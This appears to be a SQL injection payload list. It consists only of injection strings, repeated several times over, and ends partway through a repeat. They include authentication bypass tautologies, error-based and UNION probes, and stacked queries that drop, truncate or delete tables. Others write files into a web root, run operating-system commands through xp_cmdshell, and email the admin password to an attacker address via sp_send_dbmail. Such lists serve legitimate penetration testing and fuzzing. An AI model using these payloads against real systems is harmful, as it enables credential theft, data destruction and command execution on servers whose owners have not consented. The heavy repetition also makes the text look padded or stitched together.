1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
